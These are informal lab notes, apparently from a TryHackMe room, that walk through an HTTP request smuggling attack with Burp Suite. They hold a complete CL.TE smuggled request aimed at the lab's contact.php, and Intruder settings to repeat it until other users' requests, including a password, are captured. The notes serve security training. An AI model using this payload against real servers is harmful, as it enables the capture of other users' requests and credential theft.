- setup the vpn
## open burp suit:
- open proxy then turn on intruder
-  http://httprequestsmuggling.thm
-  send the request to intruder
  ## paste this:
-   POST / HTTP/1.1
- Host: httprequestsmuggling.thm
- Content-Type: application/x-www-form-urlencoded
- Content-Length: 160
- Transfer-Encoding: chunked

- 0

- POST /contact.php HTTP/1.1
- Host: httprequestsmuggling.thm
- Content-Type: application/x-www-form-urlencoded
- Content-Length: 500

- username=test&query=§
-
## payload settings
- set to null payloads
- set the payload count to 10000
- in the resource pool
- maximum to 10
- delay between request to 2000 n set to with random variations
- start attack
- check for 504 status code
- chevk the site  to /submissions, if the http is smuggeled
- click on the files to get the password one
- go to the site for login n put the password
